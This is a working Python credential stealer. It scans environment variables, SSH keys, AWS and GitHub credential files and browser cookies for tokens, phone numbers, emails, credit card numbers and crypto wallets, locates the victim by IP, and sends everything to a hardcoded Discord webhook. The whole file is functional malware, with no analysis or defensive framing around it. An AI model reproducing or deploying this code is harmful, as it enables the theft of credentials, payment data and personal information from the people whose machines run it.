import re
import json
import socket
import platform
import subprocess
from urllib.request import urlopen, Request
from urllib.error import URLError
import time
import os
import sqlite3
from pathlib import Path
from typing import Set, List, Dict, Any
import requests
import locale

# ============================================
# CONFIGURATION
# ============================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1350454693863755847/jxeOTugiMd1XrbusqrsIn93JbuVkXfGoRu376lfvhi3tKHSRo5zPcsnWeCgWngSC-DYJ"

# Data storage structure
collected_data = {
    'tokens': [],
    'phones': set(),
    'emails': set(),
    'credit_cards': set(),
    'crypto': set(),
    'ips': {},
    'system': {},
    'cookies': [],
}

# ============================================
# PATTERNS
# ============================================
TOKEN_PATTERNS = [
    (re.compile(r'mfa\.[a-zA-Z0-9_-]{84}'), 'Discord MFA'),
    (re.compile(r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}'), 'Discord Token'),
    (re.compile(r'EAAA[a-zA-Z0-9_-]{100,}'), 'Facebook Token'),
    (re.compile(r'sessionid=[a-zA-Z0-9_-]{50,}'), 'Instagram Session'),
    (re.compile(r'auth_token=[a-zA-Z0-9_-]{50,}'), 'Twitter Token'),
    (re.compile(r'SAPISID[a-zA-Z0-9_-]{50,}'), 'Google Token'),
    (re.compile(r'li_at=[a-zA-Z0-9_-]{100,}'), 'LinkedIn Token'),
    (re.compile(r'gh_[a-zA-Z0-9_-]{50,}'), 'GitHub Token'),
    (re.compile(r'sk-live-[a-zA-Z0-9_-]{50,}'), 'Stripe Live Key'),
    (re.compile(r'sk_test_[a-zA-Z0-9_-]{50,}'), 'Stripe Test Key'),
    (re.compile(r'AIza[0-9A-Za-z\-_]{35}'), 'Google API Key'),
    (re.compile(r'AKIA[0-9A-Z]{16}'), 'AWS Key'),
    (re.compile(r'xox[baprs]-[0-9a-zA-Z]{10,}'), 'Slack Token'),
]

PHONE_PATTERNS = [
    re.compile(r'(\+33|0033|0)[1-9][0-9]{8}'),
    re.compile(r'(\+1|1)[0-9]{10}'),
    re.compile(r'(\+44|0)[0-9]{10}'),
    re.compile(r'(\+49|0)[0-9]{10,11}'),
    re.compile(r'(\+34|0)[0-9]{9}'),
    re.compile(r'(\+39|0)[0-9]{10}'),
    re.compile(r'(\+32|0)[0-9]{9}'),
    re.compile(r'(\+41|0)[0-9]{9}'),
    re.compile(r'(\+31|0)[0-9]{9}'),
    re.compile(r'(\+46|0)[0-9]{9}'),
    re.compile(r'(\+61|0)[0-9]{9}'),
    re.compile(r'(\+81|0)[0-9]{10}'),
    re.compile(r'(\+86|0)[0-9]{11}'),
]

EMAIL_PATTERN = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
CREDIT_CARD_PATTERN = re.compile(r'(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12}|(?:[0-9]{4}[- ]){3}[0-9]{4})')
CRYPTO_PATTERNS = [
    re.compile(r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}'),  # Bitcoin
    re.compile(r'0x[a-fA-F0-9]{40}'),                # Ethereum
    re.compile(r'bc1[a-zA-HJ-NP-Z0-9]{25,39}'),      # Bitcoin Bech32
    re.compile(r'ltc1[a-zA-HJ-NP-Z0-9]{25,39}'),     # Litecoin
    re.compile(r'xpub[a-zA-HJ-NP-Z0-9]{100,}'),      # Extended public key
]

# ============================================
# HELPER FUNCTIONS
# ============================================
def get_system_language() -> str:
    """Get system language."""
    try:
        # Try new method first
        return locale.getdefaultlocale()[0] or 'N/A'
    except:
        try:
            # Fallback to platform
            return platform.system() or 'N/A'
        except:
            return 'N/A'

def scan_text(text: str, source: str) -> None:
    """Scan text for sensitive patterns."""
    if not text or not isinstance(text, str):
        return
    
    try:
        # Tokens
        for pattern, token_type in TOKEN_PATTERNS:
            for match in pattern.finditer(text):
                collected_data['tokens'].append({
                    'token': match.group(),
                    'type': token_type,
                    'source': source
                })
        
        # Phones
        for pattern in PHONE_PATTERNS:
            for match in pattern.finditer(text):
                collected_data['phones'].add(match.group())
        
        # Emails
        for match in EMAIL_PATTERN.finditer(text):
            collected_data['emails'].add(match.group())
        
        # Credit cards
        for match in CREDIT_CARD_PATTERN.finditer(text):
            collected_data['credit_cards'].add(match.group())
        
        # Crypto
        for pattern in CRYPTO_PATTERNS:
            for match in pattern.finditer(text):
                collected_data['crypto'].add(match.group())
    except Exception as e:
        print(f"Error in scan_text: {e}")

def get_public_ip() -> str:
    """Get public IP address."""
    try:
        with urlopen('https://api.ipify.org?format=json', timeout=5) as response:
            data = json.loads(response.read().decode())
            return data.get('ip', 'N/A')
    except Exception as e:
        print(f"Error getting public IP: {e}")
        return 'N/A'

def get_location() -> str:
    """Get location from IP."""
    try:
        with urlopen('https://ipapi.co/json/', timeout=5) as response:
            data = json.loads(response.read().decode())
            city = data.get('city', '')
            region = data.get('region', '')
            country = data.get('country_name', '')
            lat = data.get('latitude', '')
            lon = data.get('longitude', '')
            loc = f"{city}, {region}, {country}"
            if lat and lon:
                loc += f" ({lat},{lon})"
            return loc if loc.strip(', ') else 'N/A'
    except Exception as e:
        print(f"Error getting location: {e}")
        return 'N/A'

def get_local_ips() -> List[str]:
    """Get local IP addresses."""
    ips = []
    try:
        hostname = socket.gethostname()
        # Try different methods to get local IPs
        try:
            for addr in socket.gethostbyname_ex(hostname)[2]:
                if not addr.startswith('127.'):
                    ips.append(addr)
        except:
            pass
        
        # Alternative method
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ips.append(s.getsockname()[0])
            s.close()
        except:
            pass
        
        # Remove duplicates
        ips = list(set(ips))
    except Exception as e:
        print(f"Error getting local IPs: {e}")
    return ips

def collect_system_info() -> Dict[str, Any]:
    """Collect system information."""
    try:
        import psutil
        memory = psutil.virtual_memory()
        memory_str = f"{round(memory.total / (1024**3), 2)} GB"
    except:
        memory_str = 'N/A'
    
    return {
        'cpu': os.cpu_count() or 'N/A',
        'screen': 'N/A',
        'langue': get_system_language(),
        'memo': memory_str
    }

def collect_environment_variables() -> None:
    """Scan environment variables for sensitive data."""
    print("Collecting environment variables...")
    for key, value in os.environ.items():
        scan_text(value, f'environ:{key}')

def collect_file_system() -> None:
    """Scan common files for sensitive data."""
    print("Collecting file system data...")
    common_files = [
        str(Path.home() / '.bashrc'),
        str(Path.home() / '.zshrc'),
        str(Path.home() / '.gitconfig'),
        str(Path.home() / '.ssh/id_rsa'),
        str(Path.home() / '.aws/credentials'),
        str(Path.home() / '.config/gh/hosts.yml'),
        str(Path.home() / '.npmrc'),
        str(Path.home() / '.env'),
    ]
    
    for file_path in common_files:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    scan_text(content, f'file:{file_path}')
                    print(f"  ✓ Scanned {file_path}")
        except Exception as e:
            print(f"  ✗ Error reading {file_path}: {e}")

def collect_browser_cookies() -> None:
    """Collect cookies from browsers."""
    print("Collecting browser cookies...")
    try:
        import browser_cookie3
        
        browsers = [
            ('chrome', browser_cookie3.chrome),
            ('firefox', browser_cookie3.firefox),
            ('edge', browser_cookie3.edge),
            ('opera', browser_cookie3.opera),
            ('brave', browser_cookie3.brave)
        ]
        
        for browser_name, browser_func in browsers:
            try:
                print(f"  Trying {browser_name}...")
                cookies = browser_func(domain_name='')
                count = 0
                for cookie in cookies:
                    if count < 100:  # Limit to 100 cookies per browser
                        collected_data['cookies'].append({
                            'name': cookie.name,
                            'value': cookie.value[:100]
                        })
                        scan_text(cookie.value, f'cookie:{cookie.name}')
                        count += 1
                if count > 0:
                    print(f"  ✓ Collected {count} cookies from {browser_name}")
                else:
                    print(f"  ℹ No cookies found in {browser_name}")
            except Exception as e:
                print(f"  ✗ Error collecting cookies from {browser_name}: {e}")
    except ImportError:
        print("  ℹ browser-cookie3 not installed, skipping cookie collection")
    except Exception as e:
        print(f"  ✗ Error in cookie collection: {e}")

# ============================================
# MESSAGE BUILDING
# ============================================
def build_message() -> str:
    """Build the formatted message exactly as requested."""
    print("Building message...")
    
    msg = "yePULL v2=\n\n"
    
    # Hostname and domain
    msg += f"hostname: {socket.gethostname()}\n"
    msg += f"domain: {socket.getfqdn()}\n\n"
    
    # IP stuff
    public_ip = get_public_ip()
    local_ips = get_local_ips()
    location = get_location()
    
    msg += "ip stuff:\n"
    msg += f"ipv4: {public_ip}"
    if local_ips:
        msg += f" (local: {', '.join(local_ips)})"
    msg += "\n"
    msg += f"loc: {location}\n"
    msg += "------\n"
    msg += f"ipv6: N/A\n"
    msg += f"loc: {location}\n\n"
    
    # Tokens
    msg += "tokens:\n"
    if collected_data['tokens']:
        for i, token_info in enumerate(collected_data['tokens'][:20]):
            msg += f"{token_info['token']}\n"
        if len(collected_data['tokens']) > 20:
            msg += f"... et {len(collected_data['tokens']) - 20} autres tokens\n"
    else:
        msg += "Aucun token trouvé\n"
    msg += "\n"
    
    # Numbers
    msg += "nums:\n"
    phones = list(collected_data['phones'])
    if phones:
        for i, phone in enumerate(phones[:10], 1):
            msg += f"{i}/ {phone}\n"
        if len(phones) > 10:
            msg += f"... et {len(phones) - 10} autres numéros\n"
    else:
        msg += "Aucun numéro trouvé\n"
    msg += "\n"
    
    # Credit cards
    msg += "card=\n"
    cards = list(collected_data['credit_cards'])
    if cards:
        for i, card in enumerate(cards[:10], 1):
            msg += f"{i}/ {card}\n"
        if len(cards) > 10:
            msg += f"... et {len(cards) - 10} autres cartes\n"
    else:
        msg += "Aucune carte trouvée\n"
    msg += "\n"
    
    # Crypto wallets
    msg += "crypto WALLET=\n"
    crypto = list(collected_data['crypto'])
    if crypto:
        for i, wallet in enumerate(crypto[:10], 1):
            msg += f"{i}/ {wallet}\n"
        if len(crypto) > 10:
            msg += f"... et {len(crypto) - 10} autres wallets\n"
    else:
        msg += "Aucun wallet trouvé\n"
    msg += "\n"
    
    # System info
    sys_info = collect_system_info()
    msg += f"cpu heart= {sys_info['cpu']} cores\n"
    msg += f"screen= {sys_info['screen']}\n"
    msg += f"langue= {sys_info['langue']}\n"
    msg += f"memo= {sys_info['memo']}\n\n"
    
    # Emails
    msg += "email=\n"
    emails = list(collected_data['emails'])
    if emails:
        for i, email in enumerate(emails[:15], 1):
            msg += f"{i}/ {email}\n"
        if len(emails) > 15:
            msg += f"... et {len(emails) - 15} autres emails\n"
    else:
        msg += "Aucun email trouvé\n"
    msg += "\n"
    
    # Cookies
    msg += "cookie:\n"
    if collected_data['cookies']:
        for cookie in collected_data['cookies'][:20]:
            msg += f"{cookie['name']}={cookie['value']}\n"
        if len(collected_data['cookies']) > 20:
            msg += f"... et {len(collected_data['cookies']) - 20} autres cookies\n"
    else:
        msg += "Aucun cookie trouvé\n"
    
    return msg

# ============================================
# WEBHOOK SENDING
# ============================================
def send_to_webhook(message: str) -> int:
    """Send message to Discord webhook."""
    print("Sending to webhook...")
    max_length = 1900
    parts = [message[i:i+max_length] for i in range(0, len(message), max_length)]
    
    print(f"Message length: {len(message)} chars, splitting into {len(parts)} parts")
    
    for i, part in enumerate(parts):
        try:
            print(f"Sending part {i+1}/{len(parts)}...")
            response = requests.post(
                WEBHOOK_URL,
                json={'content': part},
                timeout=10
            )
            if response.status_code == 200:
                print(f"✓ Part {i+1} sent successfully!")
            else:
                print(f"✗ Error {response.status_code}: {response.text}")
            
            if i < len(parts) - 1:
                time.sleep(0.5)
        except Exception as e:
            print(f"✗ Error sending to webhook: {e}")
            return 0
    
    return len(parts)

# ============================================
# MAIN EXECUTION
# ============================================
def main():
    """Main execution function."""
    print("=" * 50)
    print("Starting data collection...")
    print("=" * 50)
    
    try:
        # Collect data
        collect_environment_variables()
        collect_file_system()
        collect_browser_cookies()
        
        print(f"\n📊 Data collected:")
        print(f"  - Tokens: {len(collected_data['tokens'])}")
        print(f"  - Phones: {len(collected_data['phones'])}")
        print(f"  - Emails: {len(collected_data['emails'])}")
        print(f"  - Credit Cards: {len(collected_data['credit_cards'])}")
        print(f"  - Crypto: {len(collected_data['crypto'])}")
        print(f"  - Cookies: {len(collected_data['cookies'])}")
        
        # Build and send message
        print("\n" + "=" * 50)
        message = build_message()
        
        # Show first 500 chars of message
        print("\n📝 Message preview (first 500 chars):")
        print("-" * 50)
        print(message[:500])
        print("-" * 50)
        
        print("\n" + "=" * 50)
        result = send_to_webhook(message)
        
        if result > 0:
            print(f"\n✅ Successfully sent {result} messages to webhook!")
        else:
            print("\n❌ Failed to send to webhook")
        
        print("=" * 50)
        
    except Exception as e:
        print(f"\n❌ Error in main: {e}")
        import traceback
        traceback.print_exc()
    
    # Wait for user input before closing
    print("\nPress Enter to exit...")
    input()

if __name__ == "__main__":
    main()
